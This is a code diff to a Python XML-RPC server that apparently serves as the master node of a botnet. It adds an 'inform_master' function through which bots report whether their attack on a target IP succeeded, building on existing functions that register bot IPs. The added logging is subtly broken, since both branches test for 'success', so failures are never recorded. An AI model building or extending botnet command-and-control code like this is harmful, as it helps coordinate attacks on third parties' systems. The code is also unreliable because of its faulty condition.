@@ -30,6 +30,14 @@ def unregisterIP(ip_address):
             file.write(ip+"\n")
 
 
+def getLogFromBotnet(ip_botnet, ip_target, status):
+    with open("log.txt", "a") as file:
+        if status == "success":
+            file.write(ip_botnet+" successfully attack " + ip_target + "\n")
+        elif status == "success":
+            file.write(ip_botnet+" failed to attack " + ip_target + "\n")
+
+
 if __name__ == '__main__':
     print(getMasterIpAddress())
     server = SimpleXMLRPCServer(
@@ -37,4 +45,5 @@ if __name__ == '__main__':
     server.register_introspection_functions()
     server.register_function(registerIP, "register_ip")
     server.register_function(unregisterIP, "unregister_ip")
+    server.register_function(getLogFromBotnet, "inform_master")
     server.serve_forever()
